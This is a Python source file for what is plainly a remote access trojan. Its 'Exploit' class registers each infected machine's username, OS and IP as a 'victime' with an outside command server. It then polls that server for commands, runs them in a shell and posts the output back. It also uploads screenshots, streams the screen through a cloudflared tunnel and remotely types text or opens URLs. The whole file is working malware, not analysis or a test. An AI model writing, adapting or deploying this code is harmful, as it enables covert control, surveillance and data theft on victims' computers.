from netpwner import NetworkPwner
from stream import *
import subprocess
import socket
import webbrowser
import threading
import pyperclip
import pyautogui
import requests
import platform
import time
import sys
import os
import re

class Exploit:
    def __init__(self):
        self.url = "https://meterpreter.pythonanywhere.com/"
        self.os_name = self.get_os_name()
        self.pattern = r"\s+",
        self.target = re.sub(r"\s+", "", subprocess.run('whoami',shell=True,capture_output=True,text=True).stdout)
        self.ip = socket.gethostbyname(socket.gethostname())
        self.T = True
        self.tunnel_process = None
        self.register()

    def launch_cloudflared_tunnel(self,port):
 
        command = [
            "cloudflared", "tunnel",
            "--url", f"http://{self.ip}:{port}"
        ]


        self.tunnel_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        url_printed = False
        while True:
            output = self.tunnel_process.stderr.readline()
            if output == '' and self.tunnel_process.poll() is not None:
                break
            if output:
                # Use regex to extract the tunnel URL (ignoring developer links)
                match = re.search(r'https://[a-zA-Z0-9.-]+\.trycloudflare\.com', output)
                if match and not url_printed:
                    url_printed = True
                    print("tunnel started")
                    return match.group(0)
            
            time.sleep(1)

    def start_local_server(self):
        def run_server():
            subprocess.run(f'python pwn/manage.py runserver {self.ip}:8000', shell=True)
        
        self.server_thread = threading.Thread(target=run_server)
        self.server_thread.start()
        print("Django server started")
    

    def stop_tunnel(self):
        if self.tunnel_process:
            print("Stopping the tunnel...")
            self.tunnel_process.terminate()  
            self.tunnel_process.wait() 
            return "Tunnel stopped."
        else:
            return "No tunnel is running."

    def get_os_name(self):
        os_name = platform.system()+platform.release()
        return os_name

    def stop_screen_share(self):
        self.T = False
        return f"stream stopped on {self.target}"

    def share_screen(self):
        self.T = True
        self.start_local_server()
        with mss() as sct:
            monitor = sct.monitors[1]
            while self.T:
                stream_screen(sct,monitor,f'http://{self.ip}:8000/register/upload_stream/',"monster",0.02)
    
    def hundle_command(self, command):
        if command.startswith("cd"):
            try:
                path = command[3:].strip()
                os.chdir(path)
                exc = os.getcwd()
            except Exception as e:
                exc=f"process faild, error : {e}"
        elif command == "pwn networks" :
            if sys.platform in ["win32", "win64"]:
                NetworkPwner.expose_data()
            else:
                exc = f"Sorry , Unsupported platform : {sys.platform}"
        elif command in  ["screenshot","scsh","screen shot"]:
            self.screenshot()
            exc = None
        elif command.startswith('write'):
            pyautogui.write(self.clean_message("write",command))
            exc = "message typed successfuly !!!"
        elif command.startswith('browser'):
            webbrowser.open(self.clean_message("browser",command))
            exc = "the browser will open in any minute!!!"

        elif command in ["screenshare","stream"]:
            url = self.launch_cloudflared_tunnel(8000)
            t1 = threading.Thread(target=self.share_screen)
            t1.start()
            exc =f"stream started by {self.target} at {url}/register/stream/{self.target}/"

        elif command in ['stop screenshare',"stop stream"]:
            exc = self.stop_screen_share()
        else: 
            exc = subprocess.run(command, shell=True,capture_output=True,text=True).stdout
        return exc
    
    
    def reverce_http(self):
        commands = requests.get(f'{self.url}/register/commands?target={self.target}').json()
        requests.delete(f'{self.url}/register/commands?target={self.target}')
        if type(commands) == list:
            for cm in commands:
                command = cm["command"]
                print(command+' recived')
                exc = self.hundle_command(command)
                if exc:
                    requests.post(f'{self.url}/register/log',json={
                        'target': self.target,
                        'log': exc,
                        'command': command,
                    })
            
    
    def register(self):
        requests.post(f'{self.url}/register/states',json={"target":self.target,"state":"Connected","os":self.os_name})
        requests.post(f'{self.url}/register/victime', json={
            "name" : self.target,
            "os" : self.os_name,
            "ip" : self.ip,
            "created" : time.time(),
        })
    
    def screenshot(self):
        screenshot = pyautogui.screenshot()
        screenshot.save(".upls/screenshot.png")
        url = f"{self.url}/register/uploads"
        files = {"file": open(".upls/screenshot.png", "rb")}
        response = requests.post(url,json={"target":self.target},files=files)
        os.remove(".upls/screenshot.png")
        if response.status_code == 200:
            return "Screenshot uploaded successfully!"
        else:
            return "Upload failed:", response.status_code, response.text
        
    def clean_up(self):
        requests.delete(f'{self.url}/register/victime?name={self.target}')
        requests.post(f'{self.url}/register/states',json={"target":self.target,"state":"Disconnected"})

    def clean_message(self,keyword,word):
        word = word.split(keyword,1)[1][1:]
        return word

    def main(self):
        try:
            while True:
                self.reverce_http()
                time.sleep(1)
        except KeyboardInterrupt:
            self.clean_up()



Exploit().main()
